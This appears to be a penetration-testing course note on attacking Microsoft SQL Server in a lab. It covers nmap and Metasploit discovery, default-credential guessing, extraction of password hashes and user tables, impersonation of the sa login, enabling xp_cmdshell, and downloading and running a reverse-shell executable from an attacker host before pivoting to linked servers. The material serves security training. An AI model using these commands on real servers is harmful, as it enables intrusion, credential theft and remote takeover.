---
tags: [module/footprinting, mssql, database, sql, windows, level/advanced, practical]
---

# MSSQL Enumeration - Practical Application

## Complete MSSQL Enumeration Workflow

Phase 1: Service Discovery
Phase 2: Authentication Testing
Phase 3: Database Enumeration
Phase 4: Data Extraction
Phase 5: Privilege Escalation
Phase 6: Command Execution (xp_cmdshell)
Phase 7: Lateral Movement

---

## Phase 1: Service Discovery

### Nmap MSSQL Scripts

ls /usr/share/nmap/scripts/ms-sql-*

Key scripts:
- ms-sql-info.nse - Basic server info
- ms-sql-empty-password.nse - Check for empty sa password
- ms-sql-ntlm-info.nse - Gather Windows info
- ms-sql-tables.nse - Enumerate tables
- ms-sql-hasdbaccess.nse - Check database access
- ms-sql-dac.nse - Check Dedicated Admin Connection
- ms-sql-dump-hashes.nse - Dump password hashes
- ms-sql-xp-cmdshell.nse - Test xp_cmdshell

### Comprehensive Nmap Scan

nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

### Sample Nmap Output

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00
| ms-sql-ntlm-info: 
|   Target_Name: SQL-01
|   NetBIOS_Domain_Name: SQL-01
|   NetBIOS_Computer_Name: SQL-01
|   DNS_Domain_Name: SQL-01
|   DNS_Computer_Name: SQL-01
|_  Product_Version: 10.0.17763
| ms-sql-info: 
|   Windows server name: SQL-01
|   10.129.201.248\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: Microsoft SQL Server 2019 RTM
|     TCP port: 1433
|     Named pipe: \\10.129.201.248\pipe\sql\query

### Metasploit MSSQL Ping

msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
msf6 auxiliary(scanner/mssql/mssql_ping) > run

[*] SQL Server information for 10.129.201.248:
[+]    ServerName      = SQL-01
[+]    InstanceName    = MSSQLSERVER
[+]    Version         = 15.0.2000.5
[+]    tcp             = 1433
[+]    np              = \\SQL-01\pipe\sql\query

---

## Phase 2: Authentication Testing

### Connect with mssqlclient.py

python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth

### Try Common Credentials

| Username | Password |
|----------|----------|
| sa | (empty) |
| sa | sa |
| sa | password |
| sa | admin |
| administrator | (empty) |
| administrator | password |
| sqladmin | sqladmin |
| mssql | mssql |

### Check Current User and Privileges

SQL> SELECT CURRENT_USER;
SQL> SELECT SYSTEM_USER;
SQL> SELECT USER_NAME();
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');

### List All Logins

SQL> SELECT name, type_desc, is_disabled FROM sys.server_principals;

---

## Phase 3: Database Enumeration

### List Databases

SQL> SELECT name FROM sys.databases;

Output:
master
tempdb
model
msdb
Transactions
Customers
HR
Finance

### Switch Database

SQL> USE master;

### List Tables in Current Database

SQL> SELECT * FROM INFORMATION_SCHEMA.TABLES;

### List Tables in Specific Database

SQL> SELECT * FROM Transactions.INFORMATION_SCHEMA.TABLES;

### Get Table Structure

SQL> SELECT COLUMN_NAME, DATA_TYPE FROM Transactions.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Users';

### List All Views

SQL> SELECT * FROM sys.objects WHERE type = 'V';

### List All Stored Procedures

SQL> SELECT name, type_desc FROM sys.objects WHERE type = 'P';

---

## Phase 4: Data Extraction

### Basic Data Extraction

SQL> USE Customers;
SQL> SELECT * FROM Users;

### Extract Specific Columns

SQL> SELECT username, password, email FROM Users;

### Extract Hashes from SQL Server

SQL> SELECT name, password_hash FROM sys.sql_logins;

### Extract Linked Servers (for lateral movement)

SQL> SELECT srvname, srvproduct, provider FROM master..sysservers;

### Dump All Databases Script

Save as mssql-extract.sql:

-- Generate SELECT statements for all tables
SELECT 'SELECT * FROM [' + TABLE_CATALOG + '].[' + TABLE_SCHEMA + '].[' + TABLE_NAME + ']' 
FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_TYPE = 'BASE TABLE';

Run each generated query to extract data.

---

## Phase 5: Privilege Escalation

### Check if Current User is Sysadmin

SQL> SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysAdmin;

1 = Yes, 0 = No

### Check Other Role Memberships

SQL> SELECT IS_MEMBER('db_owner') AS IsDBOwner;
SQL> SELECT IS_SRVROLEMEMBER('securityadmin') AS IsSecurityAdmin;
SQL> SELECT IS_SRVROLEMEMBER('serveradmin') AS IsServerAdmin;
SQL> SELECT IS_SRVROLEMEMBER('setupadmin') AS IsSetupAdmin;
SQL> SELECT IS_SRVROLEMEMBER('processadmin') AS IsProcessAdmin;
SQL> SELECT IS_SRVROLEMEMBER('diskadmin') AS IsDiskAdmin;
SQL> SELECT IS_SRVROLEMEMBER('dbcreator') AS IsDBCreator;
SQL> SELECT IS_SRVROLEMEMBER('bulkadmin') AS IsBulkAdmin;

### List All Server Roles and Members

SQL> SELECT r.name AS RoleName, m.name AS MemberName
FROM sys.server_role_members rm
JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id;

### Check for Impersonation Privileges

SQL> SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

### Impersonate Another User (if privileged)

SQL> EXECUTE AS LOGIN = 'sa';
SQL> SELECT SYSTEM_USER;

---

## Phase 6: Command Execution (xp_cmdshell)

### Check if xp_cmdshell is Enabled

SQL> SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';

### Enable xp_cmdshell (requires sysadmin)

SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;

### Execute Commands

SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'ipconfig';
SQL> EXEC xp_cmdshell 'net user';
SQL> EXEC xp_cmdshell 'net localgroup administrators';

### PowerShell Commands via xp_cmdshell

SQL> EXEC xp_cmdshell 'powershell -c Get-Process';
SQL> EXEC xp_cmdshell 'powershell -c Get-Service';

### Download File with PowerShell

SQL> EXEC xp_cmdshell 'powershell -c Invoke-WebRequest -Uri http://10.10.14.4/rev.exe -OutFile C:\Windows\Temp\rev.exe';

### Execute Reverse Shell

SQL> EXEC xp_cmdshell 'C:\Windows\Temp\rev.exe';

---

## Phase 7: Lateral Movement

### Enumerate Linked Servers

SQL> SELECT srvname, srvproduct, provider, datasource, catalog FROM master..sysservers;

### Execute Commands on Linked Server

SQL> EXEC ('SELECT @@version') AT [LINKED_SERVER_NAME];

### Run xp_cmdshell on Linked Server

SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME];

### Impersonate SA on Linked Server

SQL> EXECUTE AS LOGIN = 'sa';
SQL> EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER_NAME];

### Enable xp_cmdshell on Linked Server

SQL> EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [LINKED_SERVER_NAME];
SQL> EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [LINKED_SERVER_NAME];
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME];

---

## Useful T-SQL Commands

| Command | Description |
|---------|-------------|
| SELECT @@VERSION | Get SQL Server version |
| SELECT @@SERVERNAME | Get server name |
| SELECT DB_NAME() | Get current database |
| SELECT USER_NAME() | Get current username |
| SELECT SYSTEM_USER | Get login name |
| SELECT IS_SRVROLEMEMBER('sysadmin') | Check if sysadmin |
| SELECT name FROM sys.databases | List databases |
| SELECT * FROM sys.sql_logins | List SQL logins |
| SELECT * FROM sys.server_principals | List all principals |
| SELECT * FROM sys.configurations | View configurations |
| EXEC sp_configure | Show config options |
| EXEC xp_cmdshell 'command' | Run OS command |
| EXEC sp_readerrorlog | Read SQL error log |

---

## Complete MSSQL Enumeration Script

Save as mssql-enum.sql:

-- Basic server info
SELECT @@VERSION AS Version;
SELECT @@SERVERNAME AS ServerName;
SELECT SYSTEM_USER AS SystemUser;
SELECT CURRENT_USER AS CurrentUser;
SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysAdmin;

-- List databases
SELECT name, database_id, create_date FROM sys.databases;

-- List logins
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S', 'U');

-- List SQL logins and password hashes
SELECT name, password_hash FROM sys.sql_logins;

-- List server roles and members
SELECT r.name AS RoleName, m.name AS MemberName
FROM sys.server_role_members rm
JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id;

-- Check xp_cmdshell status
SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';

-- List linked servers
SELECT srvname, srvproduct, provider, datasource, catalog FROM master..sysservers;

-- List databases we have access to
SELECT d.name, HAS_DBACCESS(d.name) AS HasAccess
FROM sys.databases d;

Save and run with:
SQL> :r /path/to/mssql-enum.sql

---

## Tool Comparison

| Tool | Purpose | Best For |
|------|---------|----------|
| mssqlclient.py | Interactive shell | Manual enumeration |
| Nmap scripts | Discovery | Initial footprinting |
| Metasploit auxiliary | Automated scanning | Multiple hosts |
| SSMS | GUI management | Deep analysis (if RDP) |
| SQLCMD | Command-line | Batch operations |

---

## Key Takeaways

- MSSQL default port: 1433/tcp
- Windows Authentication is default (AD integrated)
- "sa" account is the superuser - always test
- xp_cmdshell allows command execution (if enabled)
- Linked servers enable lateral movement
- Named pipes provide alternate access
- Impacket's mssqlclient.py is essential
- Check for weak service account privileges
- SQL Server Agent jobs can be abused
- Always enumerate linked servers
- Database credentials can lead to domain compromise
